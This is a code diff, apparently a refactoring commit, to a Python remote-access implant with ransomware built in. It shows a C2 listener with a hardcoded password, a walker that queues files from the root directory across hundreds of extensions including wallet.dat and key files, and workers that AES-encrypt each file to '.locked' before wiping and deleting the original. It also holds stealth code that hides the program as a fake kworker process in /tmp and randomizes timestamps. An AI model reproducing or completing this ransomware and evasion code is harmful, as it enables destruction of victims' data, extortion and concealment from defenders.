@@ -7,18 +7,10 @@ import sys
 import uuid
 import threading
 import queue
-from Crypto.Cipher import AES
+from Cryptodome.Cipher import AES
 
 import requests
 
-# For use where no verified domain is available for C2
-import urllib3
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-try:
-	import pwd
-except ModuleNotFoundError:
-	pwd = None
 import shutil
 import shlex
 import time
@@ -26,12 +18,20 @@ import random
 import pathlib
 import base64
 
+# For use where no verified domain is available for C2
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+try:
+	import pwd
+except ModuleNotFoundError:
+	pwd = None
+
 # TODO signed packets, not passwords
 password = "password"
 HOST, PORT = "0.0.0.0", 9998
 debug = True
-
-
 
 c2_id = 0
 
@@ -156,6 +156,7 @@ def run_builtin(command, parameters):
 	"""
 	Run builtin command, not local terminal
 	Args:
+		parameters:
 		command:
 
 	Returns:
@@ -172,8 +173,8 @@ def run_builtin(command, parameters):
 	elif command == "usr":
 		return os.getlogin()
 	elif command == "lock":
-		
-		# Removes self if succesful 
+
+		# Removes self if successful
 		if execute_ransom(parameters):
 			presence("KILL")
 		else:
@@ -249,7 +250,7 @@ def upgrade_shell():
 		pass
 
 
-def select_files(start, q):
+def select_files(start):
 	"""Walk through directory, add all files to queue
 
 	Arguments:
@@ -259,35 +260,73 @@ def select_files(start, q):
 		queue containing all file names
 	"""
 	q = queue.Queue()
-	EXTS = ('.txt','.exe', '.php', '.pl', '.7z', '.rar', '.m4a', '.wma', '.avi', '.wmv', '.csv', '.d3dbsp', '.sc2save', '.sie', '.sum', '.ibank', '.t13', '.t12', '.qdf', '.gdb', '.tax', '.pkpass', '.bc6', '.bc7', '.bkp', '.qic', '.bkf', '.sidn', '.sidd', '.mddata', '.itl', '.itdb', '.icxs', '.hvpl', '.hplg', '.hkdb', '.mdbackup', '.syncdb', '.gho', '.cas', '.svg', '.map', '.wmo', '.itm', '.sb', '.fos', '.mcgame', '.vdf', '.ztmp', '.sis', '.sid', '.ncf', '.menu', '.layout', '.dmp', '.blob', '.esm', '.001', '.vtf', '.dazip', '.fpk', '.mlx', '.kf', '.iwd', '.vpk', '.tor', '.psk', '.rim', '.w3x', '.fsh', '.ntl', '.arch00', '.lvl', '.snx', '.cfr', '.ff', '.vpp_pc', '.lrf', '.m2', '.mcmeta', '.vfs0', '.mpqge', '.kdb', '.db0', '.mp3', '.upx', '.rofl', '.hkx', '.bar', '.upk', '.das', '.iwi', '.litemod', '.asset', '.forge', '.ltx', '.bsa', '.apk', '.re4', '.sav', '.lbf', '.slm', '.bik', '.epk', '.rgss3a', '.pak', '.big', '.unity3d', '.wotreplay', '.xxx', '.desc', '.py', '.m3u', '.flv', '.js', '.css', '.rb', '.png', '.jpeg', '.p7c', '.p7b', '.p12', '.pfx', '.pem', '.crt', '.cer', '.der', '.x3f', '.srw', '.pef', '.ptx', '.r3d', '.rw2', '.rwl', '.raw', '.raf', '.orf', '.nrw', '.mrwref', '.mef', '.erf', '.kdc', '.dcr', '.cr2', '.crw', '.bay', '.sr2', '.srf', '.arw', '.3fr', '.dng', '.jpeg', '.jpg', '.cdr', '.indd', '.ai', '.eps', '.pdf', '.pdd', '.psd', '.dbfv', '.mdf', '.wb2', '.rtf', '.wpd', '.dxg', '.xf', '.dwg', '.pst', '.accdb', '.mdb', '.pptm', '.pptx', '.ppt', '.xlk', '.xlsb', '.xlsm', '.xlsx', '.xls', '.wps', '.docm', '.docx', '.doc', '.odb', '.odc', '.odm', '.odp', '.ods', '.odt', '.sql', '.zip', '.tar', '.tar.gz', '.tgz', '.biz', '.ocx', '.html', '.htm', '.3gp', '.srt', '.cpp', '.mid', '.mkv', '.mov', '.asf', '.mpeg', '.vob', '.mpg', '.fla', '.swf', '.wav', '.qcow2', '.vdi', '.vmdk', '.vmx', '.gpg', '.aes', '.ARC', '.PAQ', '.tar.bz2', '.tbk', '.bak', '.djv', '.djvu', '.bmp', '.cgm', '.tif', '.tiff', '.NEF', '.cmd', '.class', '.jar', '.java', '.asp', '.brd', '.sch', '.dch', '.dip', '.vbs', '.asm', '.pas', '.ldf', '.ibd', '.MYI', '.MYD', '.frm', '.dbf', '.SQLITEDB', '.SQLITE3', '.asc', '.lay6', '.lay', '.ms11 (Security copy)', '.sldm', '.sldx', '.ppsm', '.ppsx', '.ppam', '.docb', '.mml', '.sxm', '.otg', '.slk', '.xlw', '.xlt', '.xlm', '.xlc', '.dif', '.stc', '.sxc', '.ots', '.ods', '.hwp', '.dotm', '.dotx', '.docm', '.DOT', '.max', '.xml', '.uot', '.stw', '.sxw', '.ott', '.csr', '.key', 'wallet.dat')
+	extensions = (
+		'.txt', '.exe', '.php', '.pl', '.7z', '.rar', '.m4a', '.wma', '.avi', '.wmv', '.csv', '.d3dbsp', '.sc2save',
+		'.sie',
+		'.sum', '.ibank', '.t13', '.t12', '.qdf', '.gdb', '.tax', '.pkpass', '.bc6', '.bc7', '.bkp', '.qic', '.bkf',
+		'.sidn', '.sidd', '.mddata', '.itl', '.itdb', '.icxs', '.hvpl', '.hplg', '.hkdb', '.mdbackup', '.syncdb',
+		'.gho',
+		'.cas', '.svg', '.map', '.wmo', '.itm', '.sb', '.fos', '.mcgame', '.vdf', '.ztmp', '.sis', '.sid', '.ncf',
+		'.menu',
+		'.layout', '.dmp', '.blob', '.esm', '.001', '.vtf', '.dazip', '.fpk', '.mlx', '.kf', '.iwd', '.vpk', '.tor',
+		'.psk',
+		'.rim', '.w3x', '.fsh', '.ntl', '.arch00', '.lvl', '.snx', '.cfr', '.ff', '.vpp_pc', '.lrf', '.m2', '.mcmeta',
+		'.vfs0', '.mpqge', '.kdb', '.db0', '.mp3', '.upx', '.rofl', '.hkx', '.bar', '.upk', '.das', '.iwi', '.litemod',
+		'.asset', '.forge', '.ltx', '.bsa', '.apk', '.re4', '.sav', '.lbf', '.slm', '.bik', '.epk', '.rgss3a', '.pak',
+		'.big', '.unity3d', '.wotreplay', '.xxx', '.desc', '.py', '.m3u', '.flv', '.js', '.css', '.rb', '.png', '.jpeg',
+		'.p7c', '.p7b', '.p12', '.pfx', '.pem', '.crt', '.cer', '.der', '.x3f', '.srw', '.pef', '.ptx', '.r3d', '.rw2',
+		'.rwl', '.raw', '.raf', '.orf', '.nrw', '.mrwref', '.mef', '.erf', '.kdc', '.dcr', '.cr2', '.crw', '.bay',
+		'.sr2',
+		'.srf', '.arw', '.3fr', '.dng', '.jpeg', '.jpg', '.cdr', '.indd', '.ai', '.eps', '.pdf', '.pdd', '.psd',
+		'.dbfv',
+		'.mdf', '.wb2', '.rtf', '.wpd', '.dxg', '.xf', '.dwg', '.pst', '.accdb', '.mdb', '.pptm', '.pptx', '.ppt',
+		'.xlk',
+		'.xlsb', '.xlsm', '.xlsx', '.xls', '.wps', '.docm', '.docx', '.doc', '.odb', '.odc', '.odm', '.odp', '.ods',
+		'.odt',
+		'.sql', '.zip', '.tar', '.tar.gz', '.tgz', '.biz', '.ocx', '.html', '.htm', '.3gp', '.srt', '.cpp', '.mid',
+		'.mkv',
+		'.mov', '.asf', '.mpeg', '.vob', '.mpg', '.fla', '.swf', '.wav', '.qcow2', '.vdi', '.vmdk', '.vmx', '.gpg',
+		'.aes',
+		'.ARC', '.PAQ', '.tar.bz2', '.tbk', '.bak', '.djv', '.djvu', '.bmp', '.cgm', '.tif', '.tiff', '.NEF', '.cmd',
+		'.class', '.jar', '.java', '.asp', '.brd', '.sch', '.dch', '.dip', '.vbs', '.asm', '.pas', '.ldf', '.ibd',
+		'.MYI',
+		'.MYD', '.frm', '.dbf', '.SQLITEDB', '.SQLITE3', '.asc', '.lay6', '.lay', '.ms11 (Security copy)', '.sldm',
+		'.sldx',
+		'.ppsm', '.ppsx', '.ppam', '.docb', '.mml', '.sxm', '.otg', '.slk', '.xlw', '.xlt', '.xlm', '.xlc', '.dif',
+		'.stc',
+		'.sxc', '.ots', '.ods', '.hwp', '.dotm', '.dotx', '.docm', '.DOT', '.max', '.xml', '.uot', '.stw', '.sxw',
+		'.ott',
+		'.csr', '.key', 'wallet.dat')
 	for root, _, files in os.walk(start):
 		for file in files:
-			if file.lower().endswith(EXTS):
+			if file.lower().endswith(extensions):
 				q.put(os.path.join(root, file))
 	return q
 
+
 class Worker(threading.Thread):
-	def __init__(self, queue, key):
+	def __init__(self, q, key):
 		threading.Thread.__init__(self)
-		self.queue = queue
+		self.queue = q
 		self.key = key
 
 	def run(self):
 		while True:
-			qItem = self.queue.get()
+			q_item = self.queue.get()
 			try:
-				self.encrypt(qItem, self.key)
-				with open(qItem, 'wb'):
+				self.encrypt(q_item, self.key)
+				with open(q_item, 'wb'):
 					pass
 				try:
-					os.remove(qItem)
-				except Exception as ex:
+					os.remove(q_item)
+				except Exception:
 					pass
-			except Exception as ex:
+			except Exception:
 				pass
 			self.queue.task_done()
 
-	def encrypt(self, filename, key):
+	@staticmethod
+	def encrypt(filename, key):
 		"""Encrypt a file with AES
 
 		Arguments:
@@ -295,16 +334,16 @@ class Worker(threading.Thread):
 			key -- password
 		"""
 		chunk_size = 65536
-		outputFile = filename + '.locked'
+		output_file = filename + '.locked'
 		filesize = str(os.path.getsize(filename)).zfill(16)
-		IV = ''
+		iv = ''
 		for i in range(16):
-			IV += chr(random.randint(0, 255))
-		encryptor = AES.new(key, AES.MODE_CBC, IV)
+			iv += chr(random.randint(0, 255))
+		encryptor = AES.new(key, AES.MODE_CBC, iv)
 		with open(filename, 'rb') as (infile):
-			with open(outputFile, 'wb') as (outfile):
+			with open(output_file, 'wb') as (outfile):
 				outfile.write(filesize)
-				outfile.write(IV)
+				outfile.write(iv)
 				while True:
 					chunk = infile.read(chunk_size)
 					if len(chunk) == 0:
@@ -313,6 +352,7 @@ class Worker(threading.Thread):
 						if len(chunk) % 16 != 0:
 							chunk += ' ' * (16 - len(chunk) % 16)
 					outfile.write(encryptor.encrypt(chunk))
+
 
 def execute_ransom(key):
 	"""Execute threaded ransomware process
@@ -324,11 +364,11 @@ def execute_ransom(key):
 		Message for remote server
 	"""
 	try:
-		q = select_files()
+		q = select_files("/", )
 
 		for _ in range(4):
 			w = Worker(q, key)
-			w.setDaemon(True)
+			w.daemon = True
 			w.start()
 
 		q.join()
@@ -343,7 +383,6 @@ def execute_ransom(key):
 		return False
 
 
-
 def become_silent():
 	"""
 	Go stealth, move to secret location, set presence IOC
@@ -352,7 +391,6 @@ def become_silent():
 	"""
 
 	cmdline = sys.argv[0]
-
 
 	# TODO randomize names, dependant on parent, windows location
 	hidden, bandit = "/tmp/.mem_systemd", "[kworker/2:0-events]"
@@ -416,7 +454,7 @@ def presence(mode):
 		randomize_timestamp(touch)
 		os.environ[env] = "1"
 		return True
-	elif mode == "CHECK" and debug == False:
+	elif mode == "CHECK" and debug is False:
 		if os.path.isfile(touch):
 			return True
 		if env in os.environ and os.environ[env] == "1":
